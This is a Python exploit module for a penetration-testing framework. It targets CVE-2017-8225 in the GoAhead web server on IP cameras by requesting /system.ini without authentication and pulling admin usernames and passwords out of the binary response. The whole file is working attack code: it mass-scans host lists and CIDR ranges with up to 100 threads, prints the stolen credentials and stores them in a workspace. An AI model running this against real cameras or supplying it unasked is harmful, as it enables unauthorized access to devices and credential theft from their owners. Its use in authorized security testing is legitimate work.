import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

CRED_PATTERN = re.compile(
    b"[a-zA-Z0-9]{0,10}"
    b"(admin|user|guest|root|operator|supervisor|tech|service|manager|default|demo|666666|888888)"
    b"[a-zA-Z0-9]{0,10}"
)


@dataclass
class HostResult:
    host: str
    vulnerable: bool = False
    creds: list = field(default_factory=list)
    error: str | None = None


class GoAheadCredLeak(Auxiliary):
    NAME = "GoAhead Camera Credential Leak (CVE-2017-8225)"
    DESCRIPTION = (
        "Exploits the GoAhead web server on IP cameras that allows "
        "unauthenticated access to /system.ini via the loginuse&loginpas "
        "query string. Parses admin/user credentials from the binary response."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    DISCLOSED = "2017-08-01"
    CHECK = True
    REFERENCES = [
        "CVE-2017-8225",
        "https://nvd.nist.gov/vuln/detail/CVE-2017-8225",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=7.0, type=float, description="per-request timeout"),
        Option("THREADS", default=100, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets — set RHOSTS (or use run <target>)")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _headers(self):
        return {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/58.0.3029.110 Safari/537.3"
            )
        }

    def _check_host(self, host, bar=None):
        result = HostResult(host=host)
        url = self._base_url(host) + "/system.ini?loginuse&loginpas"

        try:
            r = requests.get(
                url,
                timeout=self.options["TIMEOUT"],
                headers=self._headers(),
                verify=False,
            )
        except requests.exceptions.RequestException as e:
            result.error = type(e).__name__
            return result

        if r.status_code != 200:
            result.error = "HTTP " + str(r.status_code)
            return result

        body_lower = r.text.lower() if r.text else ""
        if "<html" in body_lower or "<!doctype" in body_lower:
            result.error = "html response (not ini)"
            return result

        binary = r.content
        match = CRED_PATTERN.search(binary)
        if not match:
            result.error = "no credential pattern"
            return result

        try:
            username = match.group().decode("ascii")
            password_start = match.end() + 20
            password_bytes = binary[password_start:password_start + 31]
            password_match = re.search(b"[ -~]+", password_bytes)
            password = ""
            if password_match:
                password = password_match.group().decode("ascii", errors="replace").strip()
            result.vulnerable = True
            result.creds.append((username, password))
        except Exception as e:
            result.error = "parse: " + type(e).__name__
            return result

        return result

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="GoAhead",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2017-8225",
            info="system.ini leak | " + str(len(h.creds)) + " cred(s)",
        )
        for user, pwd in h.creds:
            self.report_cred(
                h.host, user, pwd,
                kind="password",
                info="CVE-2017-8225 system.ini leak",
            )

    def check(self):
        targets = self._expand_targets()
        if len(targets) > 1:
            print(colors.warn(
                "check on multiple targets: probing only " + targets[0] +
                " (use 'run' to scan all " + str(len(targets)) + ")"
            ))
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host) + "/system.ini"))
        res = self._check_host(host)
        if res.vulnerable:
            for u, p in res.creds:
                print(colors.vuln("check: " + host + " — " + u + ":" + p))
            return CheckResult.VULNERABLE
        if res.error:
            print(colors.safe("check: " + host + " not vulnerable (" + res.error + ")"))
        return CheckResult.SAFE

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        errors = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._check_host, h, bar): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        res = fut.result()
                    except Exception:
                        errors += 1
                        continue
                    if res.vulnerable:
                        hits.append(res)
                        for u, p in res.creds:
                            bar.log(colors.vuln(res.host + " — " + u + ":" + p))
                        if workspace_active:
                            self._record_host_result(res)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif res.error:
                        errors += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  errors/skips: " + colors.dimmed(str(errors)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            total_creds = sum(len(h.creds) for h in hits)
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s), {total_creds} cred(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  credentials leaked:"))
            for h in hits:
                for u, p in h.creds:
                    print("    " + colors.vuln(h.host) + "  " + colors.session(u) + ":" + p)

        return hits
